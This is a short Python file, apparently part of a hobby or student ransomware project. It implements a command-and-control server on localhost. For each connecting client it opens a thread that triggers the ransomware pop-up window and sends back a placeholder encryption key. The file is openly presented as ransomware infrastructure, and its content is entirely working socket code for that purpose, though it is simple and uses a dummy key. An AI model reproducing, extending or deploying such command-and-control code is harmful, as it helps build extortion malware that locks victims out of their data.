"""
C&C server for communication with the ransomware on local machine
"""
import socket, select
import sys
from threading import Thread

sys.path.insert(0, 'crypto/')   
from interface import pop_up_win

class ClientThread(Thread):

    def __init__(self, host, port, conn) -> None:
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.conn = conn

    def run(self):
        while True:

            data = self.conn.recv(2048)
            if not data: break
            
            #open the ransomware window when the client connects
            pop_up_win()
            print(f"recieved data: {data}")

            self.conn.send(b"Here is encryption key: XXXXXX")


class Server():
    def __init__(self, host, port) -> None:
        self.ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ss.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.ss.bind((host, port))
        self.ss.listen(1)
        self.host = host
        self.port = port
        self.threads = []

        
    def start(self):
        r_socks, w_socks, e_socks = select.select([self.ss], [], [])
        while True:
            print("waiting")
            for sock in r_socks:
                (conn, (self.host, self.port)) = self.ss.accept()
                new_thread = ClientThread(self.host, self.port, conn)
                new_thread.start()
            

if __name__ == "__main__":

    s = Server("127.0.0.1", 5789)
    s.start()
    
    sys.exit()
